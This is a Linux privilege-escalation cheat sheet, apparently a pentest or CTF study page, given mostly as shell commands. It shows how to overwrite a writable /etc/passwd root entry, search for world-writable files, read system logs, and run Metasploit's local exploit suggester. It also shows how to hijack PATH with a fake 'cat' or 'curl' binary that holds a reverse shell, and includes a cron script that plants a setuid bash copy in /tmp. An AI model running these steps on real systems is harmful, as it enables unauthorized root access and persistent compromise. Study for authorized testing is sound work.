




<h2> World Writeable files </h2><br>
Check for files owned and executed as root writeable by anyone <br>
Find world writable folders:<br>
$ find / -perm -0002 -type d 2>/dev/null<br>
<br>
see if /etc/passwd is writeable --- ls -l /etc/passwd <br>
if it is, generate a new password with openssl passwd newpasshere <br>
copy and open etc/passwd paste into root user between first and 2nd :
![image](https://user-images.githubusercontent.com/35967437/202036336-b61520e1-717d-4d25-a6a3-8f53819ca2f1.png) <br>
<br>
Find writeable for current user<br>
$ find / -path /proc -prune -o -writable 2>/dev/null<br>
<br>

Find world writable files- exclude proc:<br>
$ find / -path /proc -prune -o -perm -0002 -type f 2>/dev/null<br>
<br>
Hidden or missed files in web directories:<br>
$ ls -alhR /var/www/
$ ls -alhR /var/www/html/
$ ls -alhR /srv/www/htdocs/
$ ls -alhR /usr/local/www/apache22/data/
$ ls -alhR /opt/lampp/htdocs/<br>
<br>
Web logs:<br>
$ cat /etc/httpd/logs/access_log
$ cat /etc/httpd/logs/access.log
$ cat /etc/httpd/logs/error_log
$ cat /etc/httpd/logs/error.log
$ cat /var/log/apache2/access_log
$ cat /var/log/apache2/access.log
$ cat /var/log/apache2/error_log
$ cat /var/log/apache2/error.log
$ cat /var/log/apache/access_log
$ cat /var/log/apache/access.log
$ cat /var/log/auth.log
$ cat /var/log/chttp.log
$ cat /var/log/cups/error_log
$ cat /var/log/dpkg.log
$ cat /var/log/faillog
$ cat /var/log/httpd/access_log
$ cat /var/log/httpd/access.log
$ cat /var/log/httpd/error_log
$ cat /var/log/httpd/error.log
$ cat /var/log/lastlog
$ cat /var/log/lighttpd/access.log
$ cat /var/log/lighttpd/error.log
$ cat /var/log/lighttpd/lighttpd.access.log
$ cat /var/log/lighttpd/lighttpd.error.log
$ cat /var/log/messages
$ cat /var/log/secure
$ cat /var/log/syslog
$ cat /var/log/wtmp
$ cat /var/log/xferlog
$ cat /var/log/yum.log
$ cat /var/run/utmp
$ cat /var/webmin/miniserv.log
$ cat /var/www/logs/access_log
$ cat /var/www/logs/access.log
$ ls -alh /var/lib/dhcp3/
$ ls -alh /var/log/postgresql/
$ ls -alh /var/log/proftpd/
$ ls -alh /var/log/samba/<br>
<br>
![image](https://user-images.githubusercontent.com/35967437/200787298-1e975059-fbe5-4d8a-8313-674bb4e4e67b.png)

<h1>kernel exploits</h1>
if established session with MSFCONSOLE while sessions is established type run post/multi/recon/local_exploit_suggester identify vulnerability and type use exploitname set SESSION [meterpreter SESSION number] set LPORT run <br>
<br>

<h2>Further Paths </h2> <br>
if you find say a cron job or script referencing a system command e.g. cat, run env | grep PATH and take a look at the path. Then run which cat and see where this is being called from, e.g. /bin/cat. <br>
Run a command - touch /bin and see if you can read/write the directory, if so /mv /bin/cat /tmp <br>
Create new file named cat chmod +x cat and add reverse shell <br>
This will now be run everytime a cronjob or file references the system command. <br>
<br>
Run find / -perm -u=s -exec ls -l {} \; 2>/dev/null and look for non normal linux binary, e.g. /usr/bin/menu. Have a look if this runs as root. <br>
run strings on the full path - strings /usr/bin/menu and see what is happening, are there system commands being run? <br>
e.g. if curl is being run we can create a vulnerable version of curl. <br>
Create malicious version of curl in /tmp directory and add /tmp to path $ export - export PATH=/tmp:$PATH <br>
Execute the original binary e.g /usr/bin/menu <br>
This happens because path checks left to right every directory specified for the file, new added path directory is first on left

<h2> Cron paths </h2><br>
cat /etc/crontab <br>
look at the PATH value <br>
Create new file in path being called e.g /home/user <br>
add code<br>
#!/bin/bash<br>
<br>
cp /bin/bash /tmp/rootbash<br>
chmod +xs /tmp/rootbash<br>
<br>
add chmod +x file.sh <br>
wait for cronjob to run and run /tmp/rootbash -p <br>
